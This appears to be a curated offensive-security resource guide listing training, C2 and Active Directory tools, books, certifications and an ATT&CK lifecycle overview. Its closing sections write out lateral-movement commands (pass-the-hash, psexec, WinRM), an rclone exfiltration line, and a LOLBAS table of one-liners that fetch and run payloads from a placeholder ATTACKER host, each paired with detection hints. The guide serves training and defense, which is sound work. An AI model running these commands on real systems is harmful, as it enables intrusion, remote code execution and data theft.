# Offensive Security

Offensive security encompasses penetration testing, red teaming, adversary emulation, and vulnerability research — the disciplines that stress-test defenses by thinking and operating like attackers. Penetration testing produces scoped findings against a defined attack surface. Red teaming evaluates the full detection, response, and recovery capability of an organization by simulating a persistent, goal-oriented adversary. Adversary emulation reproduces the specific TTPs of known threat groups to validate whether controls would actually stop them. These are distinct missions with different methodologies, deliverables, and required skills — understanding that distinction is the first mark of a serious offensive security practitioner.

The field has evolved rapidly. Modern red teams must contend with EDR platforms that catch commodity tooling instantly, requiring custom implant development and living-off-the-land techniques. Active Directory remains the dominant internal attack surface, and cloud environments have opened entirely new initial access and lateral movement paths. Offensive practitioners who stay current are among the most valued in the industry precisely because the defenders they test are investing heavily to stop them.

---

## Where to Start

The fastest legal path into offensive security is through structured lab environments. Hack The Box, TryHackMe, and PentesterLab provide hands-on exploitation practice against deliberately vulnerable targets. Start with web applications — the attack surface is well-documented, the tools are accessible, and web exploitation skills transfer directly to bug bounty programs that pay cash. Move into network and Active Directory attacks once fundamentals are solid. Learn Python and PowerShell early; manual exploitation teaches the concept but automation teaches the craft.

| Stage | Focus | Where to Begin |
|---|---|---|
| Foundation | Linux/Windows basics, networking, HTTP/web app attacks, basic exploitation, Metasploit, Burp Suite, Python scripting | TryHackMe Complete Beginner path, HTB Academy Penetration Tester path (free tier), TCM Security free YouTube |
| Practitioner | Active Directory attacks (Kerberoasting, Pass-the-Hash, LDAP enumeration), privilege escalation, post-exploitation, C2 basics, reporting | HTB Pro Labs (Dante/Offshore), TCM Security PNPT curriculum, IppSec HTB walkthroughs |
| Advanced | Red team infrastructure (redirectors, OPSEC), EDR evasion, custom implant development, adversary emulation planning, purple team operations | CRTO (Zero-Point Security), SANS SEC565/SEC699, MITRE ATT&CK for adversary emulation planning |

---

## Free Training

- [IppSec](https://www.youtube.com/@ippsec) — HackTheBox walkthrough videos demonstrating real attack methodologies against retired machines; watching 20-30 IppSec videos teaches more practical offensive tradecraft than most paid courses
- [TCM Security YouTube](https://www.youtube.com/@TCMSecurityAcademy) — Free practical hacking content from Heath Adams covering Active Directory attacks, OSINT, network pentesting, and methodology; course-quality content available free
- [John Hammond](https://www.youtube.com/@_JohnHammond) — CTF walkthroughs, malware analysis, and offensive techniques explained clearly; strong for building exploitation intuition
- [TryHackMe Free Paths](https://tryhackme.com) — Structured learning paths covering network pentesting, web exploitation, and red teaming with browser-based labs requiring no local setup
- [Hack The Box Academy Free Tier](https://academy.hackthebox.com) — Penetration Tester and Bug Bounty Hunter paths with free Student tier access to foundational modules
- [Antisyphon Introductory Pentest (PWYW)](https://www.antisyphontraining.com) — Pay-what-you-can introductory penetration testing from John Strand; exceptional value for beginners
- [VulnHub](https://www.vulnhub.com) — Free downloadable vulnerable VM library for offline practice; thousands of machines across all difficulty levels
- [OffSec Proving Grounds Play](https://www.offensive-security.com/labs/) — Free tier of OffSec's lab environment; practice before attempting OSCP
- [HackTricks](https://book.hacktricks.xyz) — Comprehensive free offensive security reference covering network, web, AD, and mobile attack techniques; the practitioner's field manual for live engagements
- [LOLBAS Project](https://lolbas-project.github.io) — Living Off the Land Binaries and Scripts; reference for Windows native binary abuse in post-exploitation and EDR evasion

---

## Tools & Repositories

### C2 Frameworks
- [BishopFox/sliver](https://github.com/BishopFox/sliver) — Modern open-source cross-platform C2 from Bishop Fox; Go-based implants, mTLS/WireGuard/HTTP transport; widely used as a Cobalt Strike alternative for teams that cannot license commercial tooling
- [HavocC2/Havoc](https://github.com/HavocC2/Havoc) — Open-source C2 framework with a polished operator interface; Demon agent with sleep obfuscation, BOF support, and active community development; a serious capability for red teams and security researchers
- [BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire) — PowerShell and Python C2 framework with stagers, listeners, and a modular post-exploitation library; actively maintained by BC Security
- [cobbr/Covenant](https://github.com/cobbr/Covenant) — .NET-based C2 targeting Windows environments; task-based interface and strong .NET post-exploitation tradecraft support

### Active Directory Attacks
- [SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) — The industry-standard Active Directory attack path analysis tool; ingests AD data and visualizes shortest paths from any user to Domain Admin; used by both red teams and defenders for AD security assessment
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) — C# Kerberos toolkit covering Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden/Silver Ticket, and S4U abuse; the standard tool for Kerberos attacks
- [fortra/impacket](https://github.com/fortra/impacket) — Python networking library implementing SMB, LDAP, Kerberos, and DCE/RPC; the foundation of most Linux-based Active Directory attack tooling
- [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) — The foundational Windows credential extraction tool; LSASS dump, DCSync, Golden Ticket; understanding mimikatz tradecraft is required even when using alternatives on EDR-protected systems
- [GhostPack/Certify](https://github.com/GhostPack/Certify) — Active Directory Certificate Services attack tool for ESC1–ESC8 privilege escalation; ADCS attacks are now a standard component of every thorough AD assessment

### GhostPack / Post-Exploitation
- [GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt) — C# host reconnaissance tool running dozens of security-relevant enumerations; the standard post-exploitation host survey tool
- [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp) — C# privilege escalation auditing covering common Windows privesc paths
- [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — .NET DPAPI attack implementations for credential extraction from browser stores, Windows credential files, and certificate private keys

### Recon & OSINT
- [projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder) — Passive subdomain enumeration from dozens of OSINT sources; the standard external recon tool for subdomain discovery
- [smicallef/spiderfoot](https://github.com/smicallef/spiderfoot) — Automated OSINT platform correlating data from 200+ sources; the most comprehensive open-source OSINT automation framework
- [projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei) — Template-based vulnerability scanner widely used in external recon and bug bounty automation
- [laramies/theHarvester](https://github.com/laramies/theHarvester) — OSINT aggregation of emails, hostnames, and employee names from public internet sources

### Privilege Escalation
- [peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng) — WinPEAS and LinPEAS privilege escalation enumeration scripts; the most comprehensive and widely used privesc automation tools for both Windows and Linux
- [itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) — PowerShell-based Windows privilege escalation enumeration with clean output; excellent for OPSEC-sensitive engagements
- [DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) — Monitor Linux processes and cron jobs without root access; identifies privileged process execution for Linux privesc opportunities

### Web Exploitation
- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) — Automated SQL injection detection and exploitation across all major database backends
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Massive curated collection of payloads and bypass techniques for every web vulnerability class; the practitioner's payload reference

### Phishing & Initial Access
- [gophish/gophish](https://github.com/gophish/gophish) — Open-source phishing simulation platform; campaign management, email templates, and credential tracking for security awareness exercises
- [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) — Reverse-proxy phishing framework capturing session cookies; bypasses MFA in phishing simulations; demonstrates why phishing-resistant MFA matters

### Reference
- [swisskyrepo/InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) — Internal AD attack and post-exploitation reference; practical attack chains from initial access to domain dominance
- [swisskyrepo/HardwareAllTheThings](https://github.com/swisskyrepo/HardwareAllTheThings) — Hardware and embedded security reference for physical security assessments

---

## Commercial & Enterprise Platforms

| Platform | Role |
|---|---|
| **Cobalt Strike** | The industry-standard commercial C2 and adversary simulation platform; Beacon implant, Malleable C2 profiles, BOF ecosystem, and team server; the benchmark every other C2 is measured against; understanding Cobalt Strike tradecraft is essential for both operators and defenders who need to detect it |
| **Core Impact** | Enterprise penetration testing platform with automated exploitation and pivoting; favored in regulated industries requiring certified commercial testing tools |
| **Metasploit Pro** | Commercial tier of Metasploit with automated exploitation chains and reporting; the enterprise upgrade of the open-source framework |
| **Burp Suite Pro / Enterprise** | Essential for web application penetration testing; Pro adds scanner automation and Collaborator; Enterprise Edition adds CI/CD pipeline scanning at scale |
| **HackerOne PTaaS** | Penetration testing as a service through the HackerOne platform; crowdsourced testing from vetted researchers; increasingly adopted alongside traditional point-in-time assessments |
| **Synack Red Team** | Curated crowdsourced penetration testing with government and financial sector adoption; vetted global researcher network |
| **BreachLock** | PTaaS combining automated scanning with human pentester validation; faster turnaround and continuous testing model |
| **Bishop Fox Cosmos** | Attack surface management and continuous red teaming; automated external attack surface discovery and exploitation validation |

---

## Books & Learning

| Book | Author | Why Read It |
|---|---|---|
| Penetration Testing | Georgia Weidman | The most accessible introduction to penetration testing methodology; covers reconnaissance, exploitation, and post-exploitation with practical exercises |
| The Hacker Playbook 3 | Peter Kim | Red team-focused methodology covering infrastructure setup, initial access, lateral movement, and reporting; bridges pentesting and adversary simulation |
| Red Team Development and Operations | Joe Vest & James Tubberville | The definitive guide to building and running a corporate red team; planning, execution, reporting, and organizational integration |
| Rtfm: Red Team Field Manual | Ben Clark | Compact field reference for red team operations; Linux/Windows commands, network tools, and exploitation cheatsheets for engagements |
| The Web Application Hacker's Handbook | Stuttard & Pinto | Foundational web penetration testing methodology; systematic and comprehensive coverage of HTTP, authentication attacks, and injection |

---

## Certifications

- **OSCP** (Offensive Security Certified Professional) — The gold standard penetration testing certification; 24-hour exam compromising a lab network; required or strongly preferred by offensive security employers; validates real exploitation skill, not memorization
- **PNPT** (Practical Network Penetration Tester — TCM Security) — Practical 5-day exam requiring a full external/internal pentest plus written report; the most accessible hands-on certification at any experience level; excellent value
- **CRTO** (Certified Red Team Operator — Zero-Point Security) — Hands-on red team certification using the Havoc C2 framework; covers C2 infrastructure, phishing, Active Directory attacks, OPSEC, and evasion; the most respected red team-specific certification
- **CRTE** (Certified Red Team Expert — Altered Security) — Advanced Active Directory attack certification covering complex trust relationships, ADCS abuse, delegation attacks, and cross-forest compromise
- **OSEP** (Offensive Security Experienced Penetration Tester — OffSec) — Advanced evasion and red team operations; AV/EDR evasion, custom payload development, and advanced post-exploitation from OffSec
- **GPEN** (GIAC Penetration Tester) — Broad pentesting methodology certification; vendor-neutral and widely recognized in enterprise and government procurement requirements

---

## Channels

- [IppSec](https://www.youtube.com/@ippsec) — HackTheBox walkthrough videos demonstrating real attack methodology; the best source for watching systematic offensive tradecraft applied to realistic targets
- [TCM Security](https://www.youtube.com/@TCMSecurityAcademy) — Active Directory attacks, practical pentesting methodology, and career guidance from Heath Adams
- [John Hammond](https://www.youtube.com/@_JohnHammond) — CTF walkthroughs and offensive technique demonstrations
- [HackTheBox](https://www.youtube.com/@HackTheBox) — Official HTB channel with machine walkthroughs and offensive security training
- [LiveOverflow](https://www.youtube.com/@LiveOverflow) — Binary exploitation, CTF methodology, and browser security research with exceptional technical depth
- [Black Hills Information Security](https://www.youtube.com/@BlackHillsInformationSecurity) — Red team tradecraft, C2 methodology, and adversary emulation content

---

## Who to Follow

- [@harmj0y](https://x.com/harmj0y) — Will Schroeder; GhostPack author, BloodHound co-creator; the most productive Active Directory offensive researcher active today
- [@_dirkjan](https://x.com/_dirkjan) — Dirk-jan Mollema; prolific AD and Azure attack research; Kerberos, LDAP, ADCS, and Azure AD attack chains
- [@gentilkiwi](https://x.com/gentilkiwi) — Benjamin Delpy; mimikatz author; Windows credential research
- [@byt3bl33d3r](https://x.com/byt3bl33d3r) — Marcello Salvati; CrackMapExec author; Active Directory attack tooling
- [@_wald0](https://x.com/_wald0) — Andy Robbins; BloodHound co-creator; AD attack path research
- [@RastaMouse](https://x.com/rastamouse) — C2 development and CRTO instructor; red team tradecraft
- [@nidem](https://x.com/nidem) — Sean Metcalf; Active Directory security research; ADSecurity.org
- [@subTee](https://x.com/subTee) — Casey Smith; Windows application whitelisting bypass and LOLBins research
- [@enigma0x3](https://x.com/enigma0x3) — Matt Nelson; COM objects, UAC bypass, and Windows offensive research

---

## Key Resources

- [ATTACK-Navi](https://teamstarwolf.github.io/ATTACK-Navi/) — Map red team operation technique coverage to ATT&CK; correlate CVE-to-technique overlays for exploitation planning; track EPSS and CISA KEV status for vulnerability-based initial access selection
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — The comprehensive payload reference; bookmark it, you will use it on every engagement
- [HackTricks](https://book.hacktricks.xyz) — The practitioner's field manual; Windows, Linux, AD, and web attack techniques with real command examples
- [LOLBAS Project](https://lolbas-project.github.io) — Every Windows-native binary that can be abused offensively; essential for EDR evasion without custom tooling
- [GTFOBins](https://gtfobins.github.io) — The Linux equivalent of LOLBAS; Unix binaries for privilege escalation and shell escapes
- [ADSecurity.org](https://adsecurity.org) — Sean Metcalf's authoritative Active Directory security and attack reference; the most complete public documentation of AD offensive techniques
- [WADComs Interactive Cheatsheet](https://wadcoms.github.io) — Interactive Active Directory attack reference filtered by OS, tool, and technique; practical field reference during AD engagements
- [Exploit Database](https://www.exploit-db.com) — Offensive Security's public exploit database; public exploits and PoC code indexed by CVE and platform
---

## Attack Lifecycle Overview

The full offensive lifecycle maps to MITRE ATT&CK phases. Understanding each phase -- and the real tools used at each -- is essential for both operators and defenders.

#### Reconnaissance (TA0043)

- Passive: Shodan, Censys, SecurityTrails, WHOIS, LinkedIn for employee enumeration
- Active: nmap, Masscan, Nessus unauthenticated, Nuclei discovery templates
- OSINT automation: SpiderFoot, recon-ng, theHarvester

#### Resource Development (TA0042)

- Infrastructure: VPS (Vultr/Hetzner/DigitalOcean), domain purchase, SSL cert (Let's Encrypt)
- Categorize domain (Cisco Talos reputation check, MXToolbox, URLVoid) before use
- C2 setup: Sliver server on VPS, Apache redirector in front, domain fronting via Cloudflare

#### Initial Access (TA0001)

- Phishing: GoPhish + Evilginx3 for AiTM (Adversary-in-the-Middle) phishing with MFA capture
- Credential stuffing: Nuclei credential-stuffing templates, Hydra
- Exposed services: Check Shodan for exposed RDP, VPN login pages, Citrix/Exchange
- Supply chain: Malicious dependency injection, typosquatting (npm/pip/RubyGems)

#### Execution (TA0002)

- Living off the land: PowerShell, WMI, MSHTA, Regsvr32, Certutil, BITSAdmin (LOLBAS)
- Scripting: PowerShell one-liners, VBScript, JScript, HTA files

#### Persistence (TA0003)

- Registry run keys, scheduled tasks, services, WMI subscriptions
- COM object hijacking, DLL search order hijacking, BITS jobs
- Boot/logon autostart: Startup folder, LSA providers, Security Support Providers

#### Privilege Escalation (TA0004)

- Windows: AlwaysInstallElevated, unquoted service paths, SeImpersonatePrivilege (Potato exploits), token impersonation
- Linux: SUID/SGID binaries, sudo misconfiguration, cron jobs with writable scripts, PATH injection
- Tools: WinPEAS, LinPEAS, PowerUp, PEASS-ng suite

#### Lateral Movement (TA0008)

- WMI: `wmic /node:TARGET process call create "cmd.exe /c whoami"`
- SMB/PsExec: `psexec.py domain/user:pass@TARGET`
- Pass-the-Hash: `crackmapexec smb TARGET -u admin -H NTLM_HASH`
- RDP: `xfreerdp /u:user /p:pass /v:TARGET /cert-ignore`
- WinRM: `evil-winrm -i TARGET -u user -p pass`

#### Collection and Exfiltration (TA0009/TA0010)

- Directory listing + file search: `findstr /si password *.txt *.ini *.config`
- Cloud storage exfil: `rclone copy /data gdrive:exfil/`
- DNS exfiltration (stealthy): dnscat2, custom base32 subdomain encoding
- HTTPS: POST to attacker-controlled server over legitimate-looking HTTPS

---

## LOLBAS Reference (Living Off the Land Binaries and Scripts)

Windows-native binaries that can be abused offensively. Essential for EDR evasion without custom tooling.

| Binary | Use Case | ATT&CK | Detection |
|---|---|---|---|
| certutil.exe | Download files: `certutil -urlcache -split -f http://ATTACKER/payload.exe C:\out.exe` | T1105 | Alert on certutil with URL parameters |
| mshta.exe | Execute HTA: `mshta http://ATTACKER/evil.hta` | T1218.005 | mshta.exe making network connections |
| regsvr32.exe | Execute DLL/SCT: `regsvr32 /s /n /u /i:http://ATTACKER/evil.sct scrobj.dll` | T1218.010 | regsvr32 with /i: parameter |
| rundll32.exe | Execute DLL: `rundll32.exe evil.dll,EntryPoint` | T1218.011 | rundll32 with unusual DLL paths |
| wmic.exe | Lateral movement, process creation | T1047 | wmic with /node: or process call create |
| bitsadmin.exe | Download: `bitsadmin /transfer job http://ATTACKER/payload.exe C:\out.exe` | T1197 | bitsadmin /transfer to external URL |
| powershell.exe | Everything | T1059.001 | Encoded commands (-EncodedCommand), AMSI bypass attempts |
| wscript.exe | Execute VBScript | T1059.005 | wscript with .vbs from temp/download dirs |
| msiexec.exe | Execute MSI: `msiexec /q /i http://ATTACKER/evil.msi` | T1218.007 | msiexec fetching from URL |

---

## Vulnerability Research Process

- CVE monitoring: NVD, CISA KEV, Vulncheck, Packet Storm, ExploitDB
- PoC development workflow: Reproduce locally in lab → understand root cause → weaponize
- Bug bounty programs: HackerOne, Bugcrowd, Intigriti -- scoped responsible disclosure
- Resources: LiveOverflow YouTube, pwn.college, exploit.education VMs
